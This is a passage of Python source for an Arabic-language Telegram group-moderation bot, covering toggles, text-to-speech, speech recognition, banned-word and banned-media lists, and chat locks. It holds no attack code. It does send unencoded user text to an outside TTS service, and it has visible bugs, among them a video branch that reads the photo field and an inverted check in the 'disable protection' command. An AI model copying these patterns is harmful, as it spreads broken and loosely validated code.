                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت البايو\n☆"
                )

    if text == "تعطيل اطردني":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:enableKickMe:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} اطردني معطل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:enableKickMe:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت اطردني\n☆"
                )

    if text == "تفعيل اطردني":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:enableKickMe:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} اطردني مفعل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:enableKickMe:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت اطردني\n☆"
                )

    if text == "تعطيل التحقق":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:enableVerify:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التحقق معطل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:enableVerify:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت التحقق\n☆"
                )

    if text == "تفعيل التحقق":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:enableVerify:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} التحقق مفعل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:enableVerify:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت التحقق\n☆"
                )

    if text == "تعطيل انطقي" or text == "تعطيل انطق":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:disableSay:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} انطقي معطل من قبل\n☆"
                )
            else:
                r.set(f"{m.chat.id}:disableSay:{Dev_Zaid}", 1)
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر عطلت انطقي\n☆"
                )

    if text == "تفعيل انطقي" or text == "تفعيل انطق":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:disableSay:{Dev_Zaid}"):
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} انطقي مفعل من قبل\n☆"
                )
            else:
                r.delete(f"{m.chat.id}:disableSay:{Dev_Zaid}")
                return m.reply(
                    f"{k} من「 {m.from_user.mention} 」\n{k} ابشر فعلت انطقي\n☆"
                )

    if text.startswith("انطق "):
        if not r.get(f"{m.chat.id}:disableSay:{Dev_Zaid}"):
            txt = text.split(None, 1)[1]
            if len(txt) > 500:
                return m.reply("توكل مايمدي انطق اكثر من ٥٠٠ حرف بتعب بعدين")
            """
         det = translator.detect(txt).lang.lower()
         if det == 'fa' or det == 'ar':
           lang = 'ar'
         else:
           lang = det
         """
            id = random.randint(999, 10000)
            """
         o = gtts.gTTS(text=txt, lang="ar", slow=False)
         o.save(f'zaid{id}.mp3')
         """
            with open(f"zaid{id}.mp3", "wb") as f:
                try:
                    c.send_chat_action(m.chat.id, ChatAction.RECORD_AUDIO)
                except:
                    pass
                f.write(
                    requests.get(
                        f"https://eduardo-tate.com/AI/voice.php?text={txt}&model=3"
                    ).content
                )
            """
         audio = MP3(f'zaid{id}.mp3')
         duration=int(audio.info.length)
         os.rename(f'zaid{id}.mp3',f'zaid{id}.ogg')
         TelegramBot.send_voice(
         m.chat.id,
         voice,
         caption=f'الكلمة: {txt}',
         duration=duration
         )
         """
            try:
                c.send_chat_action(m.chat.id, ChatAction.RECORD_AUDIO)
            except:
                pass
            os.system(
                f"ffmpeg -i zaid{id}.mp3 -ac 1 -strict -2 -codec:a libopus -b:a 128k -vbr off -ar 24000 zaid{id}.ogg"
            )
            try:
                c.send_chat_action(m.chat.id, ChatAction.UPLOAD_AUDIO)
            except:
                pass
            m.reply_voice(f"zaid{id}.ogg", caption=f"الكلمة: {txt}")
            """
         voice = open(f'zaid{id}.ogg','rb')
         url = f"https://api.telegram.org/bot{c.bot_token}/sendVoice"
         response=requests.post(url, data={'chat_id': m.chat.id,'caption':f'الكلمة: {txt}','reply_to_message_id':m.id}, files={'voice': voice})
         os.remove(f'zaid{id}.ogg')
         """
            os.remove(f"zaid{id}.ogg")
            os.remove(f"zaid{id}.mp3")
            return True

    if text.startswith("انطقي "):
        if not r.get(f"{m.chat.id}:disableSay:{Dev_Zaid}"):
            txt = text.split(None, 1)[1]
            if len(txt) > 500:
                return m.reply("توكل مايمدي انطق اكثر من ٥٠٠ حرف بتعب بعدين")
            """
         det = translator.detect(txt).lang.lower()
         if det == 'fa' or det == 'ar':
           lang = 'ar'
         else:
           lang = det
         """
            id = random.randint(999, 10000)
            """
         o = gtts.gTTS(text=txt, lang="ar", slow=False)
         o.save(f'zaid{id}.mp3')
         """
            with open(f"zaid{id}.mp3", "wb") as f:
                try:
                    c.send_chat_action(m.chat.id, ChatAction.RECORD_AUDIO)
                except:
                    pass
                f.write(
                    requests.get(
                        f"https://eduardo-tate.com/AI/voice.php?text={txt}"
                    ).content
                )
            """
         audio = MP3(f'zaid{id}.mp3')
         duration=int(audio.info.length)
         os.rename(f'zaid{id}.mp3',f'zaid{id}.ogg')
         TelegramBot.send_voice(
         m.chat.id,
         voice,
         caption=f'الكلمة: {txt}',
         duration=duration
         )
         """
            try:
                c.send_chat_action(m.chat.id, ChatAction.RECORD_AUDIO)
            except:
                pass
            os.system(
                f"ffmpeg -i zaid{id}.mp3 -ac 1 -strict -2 -codec:a libopus -b:a 128k -vbr off -ar 24000 zaid{id}.ogg"
            )
            try:
                c.send_chat_action(m.chat.id, ChatAction.UPLOAD_AUDIO)
            except:
                pass
            m.reply_voice(f"zaid{id}.ogg", caption=f"الكلمة: {txt}")
            """
         voice = open(f'zaid{id}.ogg','rb')
         url = f"https://api.telegram.org/bot{c.bot_token}/sendVoice"
         response=requests.post(url, data={'chat_id': m.chat.id,'caption':f'الكلمة: {txt}','reply_to_message_id':m.id}, files={'voice': voice})
         os.remove(f'zaid{id}.ogg')
         """
            os.remove(f"zaid{id}.ogg")
            os.remove(f"zaid{id}.mp3")
            return True

    if (
        (text == "وش يقول" or text == "وش تقول؟")
        and m.reply_to_message
        and m.reply_to_message.voice
    ):
        if m.reply_to_message.voice.file_size > 20971520:
            return m.reply("حجمه اكثر من ٢٠ ميجابايت، توكل")
        id = random.randint(99, 1000)
        voice = m.reply_to_message.download(f"./zaid{id}.wav")
        s = sr.Recognizer()
        sound = AudioSegment.from_ogg(voice)
        wav_file = sound.export(voice, format="wav")
        with sr.AudioFile(wav_file) as src:
            audio_source = s.record(src)
        try:
            text = s.recognize_google(audio_source, language="ar-SA")
        except Exception as e:
            print(e)
            os.remove(f"zaid{id}.wav")
            return m.reply("عجزت افهم وش يقول ")
        os.remove(f"zaid{id}.wav")
        return m.reply(f"يقول : {text}")

    if (
        (text == "zaid" or text == "زوز")
        and m.reply_to_message
        and m.reply_to_message.voice
        and m.from_user.id == 6168217372
    ):
        if m.reply_to_message.voice.file_size > 20971520:
            return m.reply("حجمه اكثر من ٢٠ ميجابايت، توكل")
        id = random.randint(99, 1000)
        voice = m.reply_to_message.download(f"./zaid{id}.wav")
        s = sr.Recognizer()
        sound = AudioSegment.from_ogg(voice)
        wav_file = sound.export(voice, format="wav")
        with sr.AudioFile(wav_file) as src:
            audio_source = s.record(src)
        try:
            text = s.recognize_google(audio_source, language="en-US")
        except Exception as e:
            print(e)
            os.remove(f"zaid{id}.wav")
            return m.reply("عجزت افهم وش يقول ")
        os.remove(f"zaid{id}.wav")
        return m.reply(f"يقول : {text}")

    if text.startswith("منع "):
        if mod_pls(m.from_user.id, m.chat.id):
            noice = text.split(None, 1)[1]
            if r.sismember(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}", noice):
                return m.reply(
                    f"{k} الكلمة ( {noice} ) موجودة بقائمة المنع",
                    disable_web_page_preview=True,
                )
            else:
                r.sadd(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}", noice)
                return m.reply(
                    f"{k} الكلمة ( {noice} ) اضفتها الى قائمة المنع",
                    disable_web_page_preview=True,
                )

    if text.startswith("الغاء منع ") and len(text.split()) > 2:
        if mod_pls(m.from_user.id, m.chat.id):
            noice = text.split(None, 2)[2]
            if not r.sismember(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}", noice):
                return m.reply(
                    f"{k} الكلمة ( {noice} ) مو مضافة بقائمة المنع",
                    disable_web_page_preview=True,
                )
            else:
                r.srem(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}", noice)
                return m.reply(
                    f"{k} ابشر مسحت ( {noice} ) من قائمة المنع",
                    disable_web_page_preview=True,
                )

    if text == "منع" and m.reply_to_message and m.reply_to_message.media:
        if mod_pls(m.from_user.id, m.chat.id):
            rep = m.reply_to_message
            if rep.sticker:
                file_id = rep.sticker.file_id
                type = "sticker"
            if rep.animation:
                file_id = rep.animation.file_id
                type = "animation"
            if rep.photo:
                file_id = rep.photo.file_id
                type = "photo"
            if rep.video:
                file_id = rep.photo.file_id
                type = "video"
            if rep.voice:
                file_id = rep.voice.file_id
                type = "voice"
            if rep.audio:
                file_id = rep.audio.file_id
                type = "audio"
            if rep.document:
                file_id = rep.document.file_id
                type = "document"

            id = file_id[-6:]
            if r.get(f"{id}:NotAllow:{m.chat.id}{Dev_Zaid}"):
                return m.reply(f"{k} موجودة بقائمة المنع")
            else:
                r.set(f"{id}:NotAllow:{m.chat.id}{Dev_Zaid}", 1)
                r.sadd(
                    f"{m.chat.id}:NotAllowedList:{Dev_Zaid}",
                    f"file={id}&by={m.from_user.id}&type={type}&file_id={file_id}",
                )
                return m.reply(f"{k} واضفناها لقائمة المنع")

    if text == "الغاء منع" and m.reply_to_message and m.reply_to_message.media:
        if mod_pls(m.from_user.id, m.chat.id):
            rep = m.reply_to_message
            if rep.sticker:
                file_id = rep.sticker.file_id
                type = "sticker"
            if rep.animation:
                file_id = rep.animation.file_id
                type = "animation"
            if rep.photo:
                file_id = rep.photo.file_id
                type = "photo"
            if rep.video:
                file_id = rep.photo.file_id
                type = "video"
            if rep.voice:
                file_id = rep.voice.file_id
                type = "voice"
            if rep.audio:
                file_id = rep.audio.file_id
                type = "audio"
            if rep.document:
                file_id = rep.document.file_id
                type = "document"

            id = file_id[-6:]
            if not r.get(f"{id}:NotAllow:{m.chat.id}{Dev_Zaid}"):
                return m.reply(f"{k} مو موجودة بقائمة المنع")
            else:
                r.delete(f"{id}:NotAllow:{m.chat.id}{Dev_Zaid}")
                r.srem(
                    f"{m.chat.id}:NotAllowedList:{Dev_Zaid}",
                    f"file={id}&by={m.from_user.id}&type={type}&file_id={file_id}",
                )
                return m.reply(f"{k} ابشر شلتها من قائمه المنع")

    if text == "منع" and m.reply_to_message and not m.reply_to_message.media:
        if mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} المنع بالرد فقط للوسائط")

    if text == "قائمه المنع" or text == "قائمة المنع":
        text1 = "الكلمات الممنوعة:\n"
        text2 = "الوسائط الممنوعة:\n"
        count = 1
        count2 = 1
        if mod_pls(m.from_user.id, m.chat.id):
            if not r.smembers(
                f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}"
            ) and not r.smembers(f"{m.chat.id}:NotAllowedList:{Dev_Zaid}"):
                return m.reply(f"{k} مافي شي ممنوع")
            else:
                if not r.smembers(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}"):
                    text1 += "لايوجد"
                else:
                    for a in r.smembers(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}"):
                        text1 += f"{count} - {a}\n"
                        count += 1
                if not r.smembers(f"{m.chat.id}:NotAllowedList:{Dev_Zaid}"):
                    text2 += "لايوجد"
                else:
                    for a in r.smembers(f"{m.chat.id}:NotAllowedList:{Dev_Zaid}"):
                        g = a
                        id = g.split("file=")[1].split("&")[0]
                        by = g.split("by=")[1].split("&")[0]
                        type = g.split("type=")[1].split("&")[0]
                        text2 += (
                            f"{count2} - (`{id}`) ࿓ ( [{type}](tg://user?id={by}) )\n"
                        )
                return m.reply(f"{text1}\n{text2}", disable_web_page_preview=True)

    if text == "مسح قائمه المنع" or text == "مسح قائمة المنع":
        if mod_pls(m.from_user.id, m.chat.id):
            if not r.smembers(
                f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}"
            ) and not r.smembers(f"{m.chat.id}:NotAllowedList:{Dev_Zaid}"):
                return m.reply(f"{k} مافي شي ممنوع")
            else:
                if r.smembers(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}"):
                    r.delete(f"{m.chat.id}:NotAllowedListText:{Dev_Zaid}")
                if r.smembers(f"{m.chat.id}:NotAllowedList:{Dev_Zaid}"):
                    for a in r.smembers(f"{m.chat.id}:NotAllowedList:{Dev_Zaid}"):
                        file_id = a.split("file=")[1].split("&by=")[0]
                        r.delete(f"{file_id}:NotAllow:{m.chat.id}{Dev_Zaid}")
                r.delete(f"{m.chat.id}:NotAllowedList:{Dev_Zaid}")
                return m.reply(f"{k} ابشر مسحت قائمة المنع")

    if text == "قفل الكل":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if (
                r.get(f"{m.chat.id}:mute:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockEdit:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockEditM:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockVoice:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockVideo:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockNot:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockPhoto:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockPersian:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockStickers:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockFiles:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockAnimations:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockUrls:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockHashtags:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockBots:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockTags:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockMessages:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockSpam:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockForward:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockSHTM:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockAudios:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockChannels:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockJoin:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockInline:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockNSFW:{Dev_Zaid}")
            ):
                return m.reply(
                    f"{k} من 「 {m.from_user.mention} 」 \n{k} كل شي مقفل يالطيب!\n☆"
                )
            else:
                m.reply(f"{k} من 「 {m.from_user.mention} 」 \n{k} ابشر قفلت كل شي\n☆")
                r.set(f"{m.chat.id}:mute:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockJoin:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockChannels:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockEdit:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockEditM:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockVoice:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockVideo:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockNot:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockPhoto:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockStickers:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockAnimations:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockFiles:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockPersian:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockUrls:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockHashtags:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockMessages:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockTags:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockBots:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockSpam:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockInline:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockForward:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockAudios:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockSHTM:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockNSFW:{Dev_Zaid}", 1)
                return False

    if text == "فتح الكل":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if (
                not r.get(f"{m.chat.id}:mute:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockEdit:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockEditM:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockVoice:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockVideo:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockNot:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockPhoto:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockPersian:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockStickers:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockFiles:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockAnimations:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockUrls:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockHashtags:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockBots:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockTags:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockMessages:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockSpam:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockForward:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockSHTM:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockAudios:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockChannels:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockJoin:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockInline:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockNSFW:{Dev_Zaid}")
            ):
                return m.reply(
                    f"{k} من 「 {m.from_user.mention} 」 \n{k} كل شي مفتوح يالطيب!\n☆"
                )
            else:
                m.reply(f"{k} من 「 {m.from_user.mention} 」 \n{k} ابشر فتحت كل شي\n☆")
                r.delete(f"{m.chat.id}:mute:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockJoin:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockChannels:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockEdit:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockEditM:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockVoice:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockVideo:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockNot:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockPhoto:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockStickers:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockAnimations:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockFiles:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockPersian:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockUrls:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockHashtags:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockMessages:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockTags:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockBots:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockSpam:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockInline:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockForward:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockAudios:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockaddContacts:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockSHTM:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockKFR:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockNSFW:{Dev_Zaid}")
                return False

    if text == "تفعيل الحماية" or text == "تفعيل الحمايه":
        if not owner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المالك وفوق ) بس")
        else:
            if (
                r.get(f"{m.chat.id}:lockEditM:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockVoice:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockVideo:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockPhoto:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockPersian:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockStickers:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockFiles:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockAnimations:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockUrls:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockTags:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockMessages:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockSpam:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockForward:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockSHTM:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockAudios:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockChannels:{Dev_Zaid}")
                and r.get(f"{m.chat.id}:lockNSFW:{Dev_Zaid}")
            ):
                return m.reply(
                    f"{k} من 「 {m.from_user.mention} 」 \n{k} الحماية مفعله من قبل\n☆"
                )
            else:
                m.reply(
                    f"{k} من 「 {m.from_user.mention} 」 \n{k} ابشر فعلت الحمايه\n☆"
                )

                r.set(f"{m.chat.id}:lockChannels:{Dev_Zaid}", 1)
                r.delete(f"{m.chat.id}:disableWarn:{Dev_Zaid}")
                r.set(f"{m.chat.id}:lockVoice:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockVideo:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockPhoto:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockStickers:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockAnimations:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockFiles:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockPersian:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockUrls:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockTags:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockSpam:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockForward:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockAudios:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockSHTM:{Dev_Zaid}", 1)
                r.set(f"{m.chat.id}:lockNSFW:{Dev_Zaid}", 1)
                return False

    if text == "تعطيل الحماية" or text == "تعطيل الحمايه":
        if not owner_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المالك وفوق ) بس")
        else:
            if (
                r.get(f"{m.chat.id}:lockEditM:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockVoice:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockVideo:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockPhoto:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockPersian:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockStickers:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockFiles:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockAnimations:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockUrls:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockTags:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockMessages:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockSpam:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockForward:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockSHTM:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockAudios:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockChannels:{Dev_Zaid}")
                and not r.get(f"{m.chat.id}:lockNSFW:{Dev_Zaid}")
            ):
                return m.reply(
                    f"{k} من 「 {m.from_user.mention} 」 \n{k} الحماية معطله من قبل\n☆"
                )
            else:
                m.reply(
                    f"{k} من 「 {m.from_user.mention} 」 \n{k} ابشر عطلت الحمايه\n☆"
                )

                r.delete(f"{m.chat.id}:lockChannels:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockVoice:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockVideo:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockPhoto:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockStickers:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockAnimations:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockFiles:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockPersian:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockUrls:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockTags:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockSpam:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockForward:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockAudios:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockSHTM:{Dev_Zaid}")
                r.delete(f"{m.chat.id}:lockNSFW:{Dev_Zaid}")
                return False

    if text == "قفل الدردشة" or text == "قفل الدردشه" or text == "قفل الشات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:mute:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "الشات"))
            else:
                r.set(f"{m.chat.id}:mute:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "الشات"))

    if text == "فتح الدردشة" or text == "فتح الدردشه" or text == "فتح الشات":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:mute:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "الشات"))
            else:
                r.delete(f"{m.chat.id}:mute:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "الشات"))

    if text == "قفل التعديل":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockEdit:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "التعديل"))
            else:
                r.set(f"{m.chat.id}:lockEdit:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "التعديل"))

    if text == "فتح التعديل":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if not r.get(f"{m.chat.id}:lockEdit:{Dev_Zaid}"):
                return m.reply(Openn.format(k, m.from_user.mention, k, "التعديل"))
            else:
                r.delete(f"{m.chat.id}:lockEdit:{Dev_Zaid}")
                return m.reply(Open.format(k, m.from_user.mention, k, "التعديل"))

    if text == "قفل تعديل الميديا":
        if not mod_pls(m.from_user.id, m.chat.id):
            return m.reply(f"{k} هذا الامر يخص ( المدير وفوق ) بس")
        else:
            if r.get(f"{m.chat.id}:lockEditM:{Dev_Zaid}"):
                return m.reply(lockn.format(k, m.from_user.mention, k, "تعديل الميديا"))
            else:
                r.set(f"{m.chat.id}:lockEditM:{Dev_Zaid}", 1)
                return m.reply(lock.format(k, m.from_user.mention, k, "تعديل الميديا"))

